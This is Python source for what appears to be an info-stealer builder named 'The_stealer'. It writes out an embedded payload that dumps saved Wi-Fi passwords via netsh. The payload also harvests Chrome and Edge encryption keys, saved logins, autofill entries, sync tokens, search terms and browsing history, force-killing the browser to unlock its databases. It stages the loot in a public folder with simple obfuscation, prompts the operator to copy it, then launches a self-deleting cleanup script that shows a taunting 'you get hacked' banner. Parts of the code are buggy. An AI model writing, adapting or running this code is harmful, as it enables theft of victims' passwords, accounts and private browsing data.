import os;import json
row_virus_text='''true_false=['C:\\Users\\Public',True,True,True,True,True,True,True,True,True,'hello_world']
working_directory01=true_false[0]
system_info_collect=true_false[1]
chrome_data_collect=true_false[2]
chrome_data=true_false[3]
chrome_id_passsword=true_false[4]
web_data=true_false[5]
history_data=true_false[6]
edge_data=true_false[7]
dir_search=False
encrypt_data=true_false[8]
message_show_y_n=true_false[9]
message=true_false[10]
internet_accsess=true_false[11]
#insert a network checking interface:!!!!!!!!!!!!!!   idk!
import time
def check_internet_connection():
    remote_server = "www.google.com" 
    port = 80
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((remote_server, port))
        return True
    except socket.error:
        return False
    finally:
        sock.close()
while True:
    if check_internet_connection:
        break
    else:
        time.sleep(5)
        pass
# checking for requirments installed or not___ if not then installing it
import subprocess
try:
    import pip
except ImportError:
    try:
        import ensurepip
        ensurepip.bootstrap()
    except ImportError:
        pass
try:
    import os
except ImportError as e:
    subprocess.call(['pip3','install','os']) 
try:
    import platform
except ImportError as e:
    subprocess.call(['pip3','install','platform']) 
try:
    import socket
except ImportError as e:
    subprocess.call(['pip3','install','socket'])
try:
    import json
except ImportError as e:
    subprocess.call(['pip3','install','json'])
try:
    import sqlite3
except ImportError as e:
    subprocess.call(['pip3','install','sqlite3'])
try:
    import shutil
except ImportError as e:
    subprocess.call(['pip3','install','shutil'])
try:
    from termcolor import colored
except Exception as e:
    subprocess.call(['pip3','install','termcolor'])
from datetime import timezone, datetime,timedelta
#all defined funcions:-------------------------
def chrome_date_and_time(chrome_data):
    try:
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
    except Exception as e:
        print(f"Error in chrome_date_and_time: {e}")
        return None
if os.path.exists(working_directory01):
    pass
else:
    working_directory01='C:\\Users\\Public'
#directroys setting and so on________
working_directory=working_directory01+'\\info_fille'
if not os.path.exists(working_directory):
    os.mkdir(working_directory)
else:
    working_directory=working_directory+'001'
    os.mkdir(working_directory)
while True:
    listing_in_working_dirX=working_directory+'\\envirRRcomuni_0X0'
    listing_in_working_dir1=working_directory+'\\sys_encrypted_001'
    if not os.path.exists(listing_in_working_dirX):
        os.mkdir(listing_in_working_dirX)
    else:
        pass
    if not os.path.exists(listing_in_working_dir1):
        os.mkdir(listing_in_working_dir1)
    else:
        pass
    if os.path.exists(listing_in_working_dirX)and os.path.exists(listing_in_working_dir1):
        time.sleep(1)
        break
    else:
        time.sleep(1)
dir1=listing_in_working_dirX+'\\system_info.txt'
saving_info1=listing_in_working_dirX+'\\info_12001f6.txt'
saving_infor_default1=listing_in_working_dirX+'\\info_pro-chrome-default-fille02.txt'
saving_info_web_data=listing_in_working_dirX+'\\info_web_data.txt'
saving_info_history=listing_in_working_dirX+'\\info_history_data.txt'
saving_info_edage=listing_in_working_dirX+'\\saving_info_edage.txt'
info=[]
if system_info_collect:
    info.append(platform.system())
    info.append(platform.architecture())
    info.append(platform.machine())
    info.append(platform.node())
    info.append(platform.platform(aliased=True))
    info.append(platform.processor())
    info.append(platform.python_branch())
    info.append(platform.python_version())
    info.append(platform.python_revision())
    info.append(platform.win32_ver())
    host1=socket.gethostname()
    info.append(host1)
    try:
        ip_address =socket.gethostbyname(host1)
        info.append(ip_address)
    except socket.gaierror as e:
        ip_address ='ip_address: error happend-----!'
        info.append(ip_address)
    if not ip_address=='ip_address: error happend-----!':
        try:
            info.append(socket.gethostbyname(ip_address))
        except socket.gaierror as e:
            info.append('network interface: error happend-----!')
    else:
        network_interface='network interface: error happend-----!'
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    password11=[]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            password11.append(results)
        except IndexError:
            password11.append('_______')
    info.append(profiles)
    info.append(password11)
    with open(dir1,'a+',encoding='utf8') as d:
        d.write(str(info))
        d.close()
else:
    pass
data1=[]
local_state_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'
profile_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
if os.path.exists(local_state_path):
    with open(local_state_path,'r',encoding="utf-8") as f:
        local_state_data=f.read()
        local_state_jason=json.loads(local_state_data)
    encryption_key=local_state_jason["os_crypt"]["encrypted_key"]
    profile_list=local_state_jason['profile']['profiles_order']
    if chrome_data_collect:
        if chrome_data:
            data1.append(encryption_key)
            data1.append(profile_list)
            for i in profile_list:
                data2=[
                    str(local_state_jason['profile']['info_cache'][i]['gaia_given_name']),
                    str(local_state_jason['profile']['info_cache'][i]['gaia_id']),
                    str(local_state_jason['profile']['info_cache'][i]['gaia_name']),
                    str(local_state_jason['profile']['info_cache'][i]['hosted_domain']),
                    str(local_state_jason['profile']['info_cache'][i]['last_downloaded_gaia_picture_url_with_size']),
                    str(local_state_jason['profile']['info_cache'][i]['managed_user_id']),
                    str(local_state_jason['profile']['info_cache'][i]['name']),
                    str(local_state_jason['profile']['info_cache'][i]['user_name'])
                    ]
                preferanse_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Preferences'
                nothing_handale5=True
                if os.path.exists(preferanse_path):
                    with open(preferanse_path,'r',encoding='utf-8') as ppa:
                        try:
                            ppa_read=ppa.read()
                        except UnicodeDecodeError as e:
                            nothing_handale5=False
                            pass
                    def gender(ppa):
                        if ppa==1:
                            gender='male'
                        elif ppa==2:
                            gender='female'
                        else:
                            ppa='other'
                        return str(gender)
                    def accsept_lang():
                        try:
                            accept_language=ppa_jason['intl']['accept_languages']
                        except Exception as e:
                            accept_language='nothing error in fating error-404'
                        return str(accept_language)
                    if nothing_handale5:
                        ppa_jason=json.loads(ppa_read)
                        data3=[
                            str(ppa_jason['sync']['birthday']),
                            str(ppa_jason['sync']['cache_guid']),
                            str(ppa_jason['sync']['demographics']['birth_year']),
                            gender(ppa_jason['sync']['demographics']['gender']),
                            accsept_lang(),
                            str(ppa_jason['intl']['selected_languages']),
                            str(ppa_jason['google']['services']['last_gaia_id']),
                            str(ppa_jason['google']['services']['signin']['REFRESH_TOKEN_RECEIVED']['time']),
                            str(ppa_jason['google']['services']['signin']['REFRESH_TOKEN_RECEIVED']['value'])
                            ]
                    else:
                        data3=['there is some error while conecting to path']
                else:
                    data3=['error 404 preferance path not found']
                data2.append(data3)
                data1.append(data2.copy())
            with open(saving_info1,'a+',encoding='utf8') as si1:
                si1.write(str(data1))
                si1.close()
        else:
            pass 
    else:
        pass
    nothing_haandale=3
    if chrome_data_collect:
        if chrome_id_passsword:
            deta1=[]
            deta2=[]
            if os.path.exists(profile_path):#deault
                collecting_dataa=sqlite3.connect(profile_path)
                extracted_dataa=collecting_dataa.cursor()
                try:
                    queryy= extracted_dataa.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used") 
                except sqlite3.OperationalError as e:
                    os.system("taskkill /im chrome.exe /f")
                    queryy= extracted_dataa.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
                except Exception  as e:
                    nothing_haandale=nothing_haandale+10
                    deta1.append('error202:)')
                if nothing_haandale<5:
                    deta1.append('default01')
                    for row in queryy.fetchall(): #change ectracted dataa to queryy
                        deta3=[row[0],row[1],row[2],row[3],row[4],row[5]]
                        deta2.append(data3)
                    nothing_haandale=3
                else:
                    deta3=['there is nothing error:)']
                    deta2.appned(data3)
            else:
                deta1.append('error404:)')
                deta2.append(['there is nothing error404 :)'])
            deta1.append(deta2.copy())
            deta1.append('data_profile')
            deta2.clear()
            deta2.append(profile_list)
            deta2.append(encryption_key)
            nothing_handale=3
            for i in profile_list:
                path11=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Login Data'
                if os.path.exists(path11):
                    collecting_data=sqlite3.connect(path11)
                    extracted_data=collecting_data.cursor()
                    try:
                        query= extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used") 
                    except sqlite3.OperationalError as e:
                        os.system("taskkill /im chrome.exe /f")
                        query= extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used") 
                    except Exception  as e:
                        nothing_handale=nothing_handale+10
                    if nothing_handale<5:
                        deta3=[True]
                        for row in query.fetchall(): #change to extracted data to query 
                            deta4=[row[0],row[1],row[2],[row[3],row[4],row[5]]]
                            deta3.append(deta4)
                        nothing_handale=3
                    else:
                        deta3=[False,['error while conecting Error202']]
                else:
                    deta3=[False,['path does not exist Error404']]
                deta2.append(deta3.copy())
                deta3.clear()
            deta1.append(deta2.copy())
            with open(saving_infor_default1,'a+',encoding='utf8') as sid1:
                sid1.write(str(deta1))
                sid1.close()
        else:   
            pass
    else:
        pass
else:
    pass#local state does not exist# write it in every fille used here
fixing=3
fixingg=3
root1=[]
child_root1=[]
child_root2=[]
if chrome_data_collect:
    if web_data:
        web_data_default=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data'
        if os.path.exists(web_data_default):
            collecting_info=sqlite3.connect(web_data_default)
            collecting_infoo=collecting_info.cursor()
            try:
                queryy=collecting_infoo.execute('select name,value,date_created,date_last_used from autofill')
            except sqlite3.OperationalError as e:
                os.system("taskkill /im chrome.exe /f")
                queryy=collecting_infoo.execute('select name,value,date_created,date_last_used from autofill')
            except Exception as e:
                fixing=10
            if fixing<5:
                child_root1.append(True)
                for row in queryy.fetchall():
                    inisisal_data=[row[0],row[1],row[2],row[3]]
                    child_root1.append(inisisal_data)
            else:
                child_root1.append(False)
                inisisal_data=['error while conecting error202']
                child_root1.append(inisisal_data)
            root1.append(child_root1.copy())
            try:
                queryyy=collecting_infoo.execute('select service,encrypted_token from token_service')
            except sqlite3.OperationalError as e:
                os.system('taskkill /im chrome.exe /f')
                queryyy=collecting_infoo.execute('select service,encrypted_token from token_service')
            except Exception as e:
                fixingg=10
            if fixingg<5:
                child_root2.append(True)
                for i in queryyy.fetchall():
                    inisisal_data=[row[0],row[1]]
                    child_root2.append(inisisal_data)
            else:
                child_root2.append(False)
                inisisal_data=['error while conecting error 202']
                child_root2.append(inisisal_data)
        else:
            child_root1.append(False)
            inisisal_data=['error while conecting error202']
            child_root1.append(inisisal_data)
            root1.append(child_root1)
            child_root2.append(False)
            inisisal_data=['error while finding error 404']
            child_root2.append(inisisal_data)
        root1.append(child_root2.copy())
        child_root2.clear()
        child_container=[]
        child_container.append(profile_list)
        for i in profile_list:
            fixeror=3
            patth=patth=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Web Data'
            if os.path.exists(patth):
                collecting_info=sqlite3.connect(patth)
                collecting_infoo=collecting_info.cursor()
                try:
                    queryy=collecting_infoo.execute('select name,value,date_created,date_last_used from autofill')
                except sqlite3.OperationalError as e:
                    os.system("taskkill /im chrome.exe /f")
                    queryy=collecting_infoo.execute('select name,value,date_created,date_last_used from autofill')
                except Exception as e:
                    fixeror=10
                if fixeror<5:
                    child_root1.clear()
                    child_root1.append(True)
                    for row in queryy.fetchall():
                        inisisal_data=[row[0],row[1],row[2],row[3]]
                        child_root1.append(inisisal_data)
                else:
                    child_root1.clear()
                    child_root1.append(False)
                    inisisal_data=['there is some error while conecting to the data']
                    child_root1.append(inisisal_data)
            else:
                child_root1.clear()
                child_root1.append(False)
                inisisal_data=['path does not exists errror 404']
                child_root1.append(inisisal_data)
            child_container.append(child_root1.copy())
        root1.append(child_container.copy())
        child_container.clear()
        fixxeror=3
        for i in profile_list:
            patth=patth=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Web Data'
            if os.path.exists(patth):
                collecting_info=sqlite3.connect(patth)
                collecting_infoo=collecting_info.cursor()
                try:
                    queryyy=collecting_infoo.execute('select service,encrypted_token from token_service')
                except sqlite3.OperationalError as e:
                    os.system('taskkill /im chrome.exe /f')
                    queryyy=collecting_infoo.execute('select service,encrypted_token from token_service')
                except Exception as e:
                    fixxeror=10
                if fixxeror<5:
                    child_root2.append(True)
                    for i in queryyy.fetchall():
                        inisisal_data=[row[0],row[1]]
                        child_root2.append(inisisal_data)
                else:
                    child_root2.append(False)
                    inisisal_data=['there is some error while conecting to the data']
                    child_root2.append(inisisal_data)
            else:
                child_root2.append(False)
                inisisal_data=['path does not exists errror 404']
                child_root2.append(inisisal_data)
            child_container.append(child_root2.copy())
            child_root2.clear()
        root1.append(child_container.copy())
        child_container.clear()
    else:
        pass
else:
    pass
with open(saving_info_web_data,'a+',encoding='utf8')as writeing:
    writeing.write(str(root1))
    writeing.close()
fixthing=3
fixthing1=3
root1=[]
keyword=[]
visted_sites=[]
if chrome_data_collect:
    if history_data:
        history_default_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
        if os.path.exists(history_default_path):
            root1.append(True)
            history_d=sqlite3.connect(history_default_path)
            history_dataa=history_d.cursor()
            try:
                query=history_dataa.execute('select term from keyword_search_terms')
            except sqlite3.OperationalError as e:
                os.system('taskkill /im chrome.exe /f')
                query=history_dataa.execute('select term from keyword_search_terms')
            except Exception as e:
                fixthing=10
            if fixthing<5:
                keyword.append(True)
                data_key=[]
                for row in query.fetchall():
                    name=row[0]
                    data_key.append(name)
                fixthing=3
                keyword.append(data_key.copy())
            else:
                keyword.append(False)
                data_key=['there is some errro while conecting']
                keyword.append(data_key.copy())
            try:
                query2=history_data.execute('select url,title,visit_count from urls')
            except sqlite3.OperationalError as e:
                os.system('taskkill /im chrome.exe /f')
                query2=history_data.execute('select url,title,visit_count from urls')
            except Exception as e:
                    fixthing1=10
            if fixthing1<5:
                visted_sites.append(True)
                data_site=[]
                for row in query2.fetchall():
                    extracted_data=[row[0],row[1],row[2]]
                    data_site.append(extracted_data)
                visted_sites.append(data_site.copy())
                fixthing1=3
            else:
                visted_sites.append(False)
                data_site=['there is some errro while conecting']
                visted_sites.append(data_site.copy())
            root1.append(keyword.copy())
            root1.append(visted_sites.copy())
        else:
            root1.append(False)
            root1.append('keyword---error 404')
            root1.append('visted_site---error 404')
        fixthing=3
        fixthing1=3
        root_child=[]
        root1.append(profile_list)
        for i in profile_list:
            historypath=os.environ["USERPROFILE"]+str('\\AppData\\Local\\Google\\Chrome\\User Data\\')+str(i)+str('\\History')
            child_01=[]
            if os.path.exists(historypath):
                child_01.append(True)
                keyword=[]
                history_d=sqlite3.connect(historypath)
                history_data=history_d.cursor()
                try:
                    query1=history_data.execute('select term from keyword_search_terms')
                except sqlite3.OperationalError as e:
                    os.system('taskkill /im chrome.exe /f')
                    query1=history_data.execute('select term from keyword_search_terms')
                except Exception as e:
                        fixthing0=10
                if fixthing<5:
                    keyword.append(True)
                    data_key=[]
                    for row in query1:
                        name=row[0]
                        data_key.append(name)
                    fixthing0=3
                    keyword.append(data_key.copy())
                else:
                    keyword.append(False)
                    data_key=['there where some error while conecting']
                    keyword.append(data_key.copy)
                    pass
                visted_sites=[]
                try:
                    query2=history_data.execute('select url,title,visit_count from urls')
                except sqlite3.OperationalError as e:
                    os.system('taskkill /im chrome.exe /f')
                    query2=history_data.execute('select url,title,visit_count from urls')
                except Exception as e:
                        fixthing1=10
                if fixthing1<5:
                    visted_sites.append(True)
                    data_site=[]
                    for row in query2:
                        extracted_data=[row[0],row[1],row[2]]
                        data_site.append(extracted_data.copy())
                    fixthing1=3
                    visted_sites.append(data_site.copy())
                else:
                    visted_sites.append(False)
                    data_site=['there where some error while conecting']
                    visted_sites.append(data_site.copy)
            else:
                child_01.append('keyword---error 404')
                child_01.append('visted_site---error 404')
            child_01.append(keyword.copy())
            child_01.append(visted_sites.copy())
            root_child.append(child_01.copy())
        root1.append(root_child)
        with open(saving_info_history,'a+',encoding='utf-8') as sih:
            sih.write(str(root1))
            sih.close()
    else:
        pass
else:
    pass
root1=[]
if edge_data:
    path_of_userdata=os.environ["USERPROFILE"]+'\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State'
    with open(path_of_userdata,'r',encoding="utf-8") as pou:
        pow=pou.read()
        data=json.loads(pow)
        encryption_key_edge=data['os_crypt']['encrypted_key']
        child_root1=[
        str(data['profile']['info_cache']['Default']['edge_account_cid']),
        str(data['profile']['info_cache']['Default']['edge_account_first_name']),
        str(data['profile']['info_cache']['Default']['edge_account_last_name']),
        str(data['profile']['info_cache']['Default']['gaia_id']),
        str(data['profile']['info_cache']['Default']['gaia_name']),
        str(data['profile']['info_cache']['Default']['user_name']),
        encryption_key_edge
        ]
    root1.append(child_root1.copy()) 
    child_root2=[]
    path2_login_data=os.environ["USERPROFILE"]+'\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
    collecting_dataa=sqlite3.connect(path2_login_data)
    extracted_dataa=collecting_dataa.cursor()
    nothing_haandale=3
    try:
        queryy= extracted_dataa.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used") 
    except sqlite3.OperationalError as e:
        os.system("taskkill /im chrome.exe /f")
        queryy= extracted_dataa.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
    except Exception  as e:
        nothing_haandale+=10
    if nothing_haandale<5:
        child_root2.append(True)
        for row in queryy.fetchall():
            inisial_data=[row[0],row[1],row[2],row[3],row[4]]
            child_root2.append(inisial_data)
    else:
        child_root2.append(False)
        child_root2.append(['there is some error while conecting'])
    root1.append(child_root2.copy())
    with open(saving_info_edage,'a+',encoding='utf-8')as sie:
        sie.write(str(root1))
        sie.close()
else:
    pass
dir_search_info=[]




def number_coding(string):
    #must only contain number and alphabate and ',' and '.'
    import random
    encoded_str=''
    coding2=['79','81','82','86','88','89','91','96','97','99']
    coding={' ':'53','q':'12','w':'45','e':'56','r':'34','t':'87','y':'65','u':'69','i':'55','o':'33','p':'63','a':'61','s':'85','d':'83','f':'58','g':'28','h':'25','j':'54','k':'72','l':'95','z':'51','x':'73','c':'93','v':'27','b':'92','n':'84','m':'26','1':'32','2':'43','3':'94','4':'41','5':'75','6':'78','7':'38','8':'67','9':'98','0':'22',',':'16','.':'36','!':'11','@':'13','#':'14','$':'15','%':'17','^':'18','&':'19','*':'21','(':'23',')':'24','_':'29','-':'31','+':'35','=':'37','~':'39','`':'42','<':'44',',':'46','>':'47','.':'48','?':'52','/':'49',':':'57',';':'59','"':'62',"'":'64','{':'66','[':'68','}':'71',']':'74','\\':'76','|':'77'}
    for i in string:
        if i in coding:
            encoded_str += coding[i]+'0'
        else:
            encoded_str += i+'0'
    list1=encoded_str.split('0')
    str1=''
    for i in list1:
        if i == '53':
            str1+= random.choice(coding2)+'0'
        else:
            str1+=i+'0'
    return(str1)
if encrypt_data:
    list_of_fille_created=os.listdir(listing_in_working_dirX)
    for i in list_of_fille_created:
        with open(listing_in_working_dir1+'\\'+i,'w+')as god:
            with open(listing_in_working_dirX+'\\'+i,'rb')as satan:
                encryption_value=number_coding(str(satan.read()))
                satan.close()
            god.write(encryption_value)
            god.close()
    pass
else:
    pass
x=__file__.split('\\')
x[-1]='startup.bat'
bat_fille=''
for i in x:
    bat_fille+='\\'+i
bat_fille=bat_fille[1:]
if internet_accsess:
    pass#sending
else:
    pass#waiting
#ssending_data_to_devies:
if internet_accsess:
    while True:
        timmer=120
        print('all fille extracted to and saved to\n',listing_in_working_dir1,'\ncopy the whole foleder(sys_encrypted_001) in your devies under 2min after that it will delete everything:)')
        print('time remain  ',timmer,)
        timmer-=1
        time.sleep(1)
        os.system('cls')
        if timmer==0:
            break
        else:
            pass
else:
    while True:
        timmer=120
        print('all fille extracted to and saved to\n',listing_in_working_dir1,'\ncopy the whole foleder(sys_encrypted_001) in your devies under 2min after that it will delete everything:)')
        print('time remain  ',timmer,)
        timmer-=1
        time.sleep(1)
        os.system('cls')
        if timmer==0:
            break
        else:
            pass
string=\'\'\'
list1=[]
import os
import time
time.sleep(3)
code_path_killer=list1[0]
code_path_bat=list1[1]
working_directory=list1[2]
message_y_n=list1[3]
message=list1[4]
if os.path.exists(code_path_killer):
    os.remove(code_path_killer)
else:
    pass
if os.path.exists(code_path_bat):
    os.remove(code_path_bat)
if os.path.exists(working_directory):
    try:
        import shutil
        shutil.rmtree(working_directory)
    except Exception as e:
        import os
        x_fille=working_directory+'\\envirRRcomuni_0X0'
        E_fille=working_directory+'\\sys_encrypted_001'
        x_fille_name=os.listdir(x_fille)
        for i in x_fille_name:
            delet_path=x_fille+'\\'+i
            os.remove(delet_path)
        try:
            os.rmdir(x_fille)
        except Exception as e:
            pass
        E_fille_name=os.listdir(E_fille)
        for i in E_fille_name:
            delete_path=E_fille+'\\'+i
            os.remove(delete_path)
        try:
            os.rmdir(E_fille)
        except Exception as e:
            pass
        try:
            os.rmdir(working_directory)
        except Exception as e:
            pass
else:
    pass
if message_y_n:
    text=message
    color_avilable=True
    try:
        from termcolor import colored
    except Exception as e:
        color_avilable=False
        pass
    import time
    import os
    if color_avilable:
        def style(text1,text2,text3,c1,c2):
            print(colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1))
            print(colored('==|',color=c2)+'      '+colored('+',color=c2,attrs=['bold'])+'                  '+colored('*',color=c2,attrs=['bold'])+'                                          '+colored('|==',color=c2))
            print(colored('==|',color=c1)+'                    '+colored('*',color=c1,attrs=['bold'])+'                         '+colored('*',color=c1,attrs=['bold'])+'                     '+colored('|==',color=c1))
            print(colored('==|',color=c2)+'                                    '+colored('+',color=c1,attrs=['bold'])+'                          '+colored('*',color=c2,attrs=['bold'])+'    '+colored('|==',color=c2))
            print(colored('==|',color=c1)+''+'{:^{}}'.format(colored(text1,color=c1,attrs=['bold']),81)+colored('|==',color=c1))
            print(colored('==|',color=c2)+''+'{:^{}}'.format(colored(text2,color=c2,attrs=['bold']),81)+colored('|==',color=c2))
            print(colored('==|',color=c1)+''+'{:^{}}'.format(colored(text3,color=c1,attrs=['bold']),81)+colored('|==',color=c1))
            print(colored('==|',color=c2)+'                                               '+colored('+',color=c1,attrs=['bold'])+'                    '+colored('|==',color=c2))
            print(colored('==|',color=c1)+'                      '+colored('+',color=c1,attrs=['bold'])+'                                        '+colored('*',color=c1,attrs=['bold'])+'    '+colored('|==',color=c1))
            print(colored('==|',color=c2)+'       '+colored('*',color=c2,attrs=['bold'])+'                      '+colored('*',color=c1,attrs=['bold'])+'                          '+colored('*',color=c2,attrs=['bold'])+'          '+colored('|==',color=c2))
            print(colored('==|',color=c1)+'       '+colored('+',color=c1,attrs=['bold'])+'                      '+colored('*',color=c2,attrs=['bold'])+'                          '+colored('+',color=c1,attrs=['bold'])+'          '+colored('|==',color=c1))
            print(colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2))
        if len(text)<=68:
            text_list=text[0:]
            text_list0=''
            text_list1=''
        elif len(text)<=136:
            text_list=text[0:68]
            text_list0=text[68:0]
            text_list1=''
        elif len(text)<=204:
            text_list=text[0:68]
            text_list0=text[68:136]
            text_list1=text[136:]
        else:
            text_list='you are stupid :>'
            text_list0='and cute <3'
            text_list1="that's why you get hacked:0"
        switch=True
        while True:
            if switch:
                c1='yellow'
                c2='blue'
                switch=False
            else:
                c1='blue'
                c2='yellow'
                switch=True
            style(text_list,text_list0,text_list1,c1,c2)
            time.sleep(0.20)
            os.system('cls')
    else:
        def style(text1,text2,text3):
            print('==========================================================================')
            print('==|      +                  *                                          |==')
            print('==|                    *                         *                     |==')
            print('==|                                    +                          *    |==')
            print('==|'+'{:^{}}'.format(text1,68)+'|==')
            print('==|'+'{:^{}}'.format(text2,68)+'|==')
            print('==|'+'{:^{}}'.format(text3,68)+'|==')
            print('==|                                               +                    |==')
            print('==|                      +                                        *    |==')
            print('==|       *                      *                          *          |==')
            print('==========================================================================')
        if len(text)<=68:
            text_list=text[0:]
            text_list0=''
            text_list1=''
        elif len(text)<=136:
            text_list=text[0:68]
            text_list0=text[68:0]
            text_list1=''
        elif len(text)<=204:
            text_list=text[0:68]
            text_list0=text[68:136]
            text_list1=text[136:]
        else:
            text_list='you are stupid :>'
            text_list0='and cute <3'
            text_list1="that's why you get hacked:0"
        style(text_list,text_list0,text_list1)
else:
    pass\'\'\'
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
nothing=input('enter anything to start deletaion prossess')
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

list1=[__file__,bat_fille,working_directory,message_show_y_n,message]
ind=string.index('list1')
write12=string[0:ind+6]+str(list1)+string[ind+8:]
path_desktop=os.environ["USERPROFILE"]+'\\Desktop\\dont_open.py'
with open(path_desktop,'w')as pywrite:
    pywrite.write(write12)
    pywrite.close()
time.sleep(3)
command = f'pythonw "{path_desktop}"'
subprocess.Popen(command, shell=True)
quit()
'''
def create_path(path:str,check_file=False,json_file=False,content={"name":None}):
    '''Checks if the path exists and creates it if it doesn't.If check_file is True, checks for the existence of a file.'''
    if json_file:check_file=True
    if not check_file:None if os.path.exists(path) else os.mkdir(path)
    else:
        if json_file:json.dump(content,file:=open(path,'w'));file.close()
        else:file=open(path,'w+');file.write(content);file.close()

# =====>paths list <=========================
root_path='C:\\Users\\Public\\akki'
main_path=root_path+'\\The_stealer'
dev_resorse=main_path+'\\dev_path'
# ['info_mv.json','row_virus.txt']
info_resorse=main_path+'\\info_path'
create_path(root_path)
create_path(main_path)
create_path(dev_resorse)
create_path(dev_resorse+'\\info_mv.json',check_file=True,json_file=True,content={"name_of_attacks":{'demo':'demo'},})
create_path(info_resorse)
create_path(dev_resorse+'\\row_virus.txt',check_file=True,content=row_virus_text)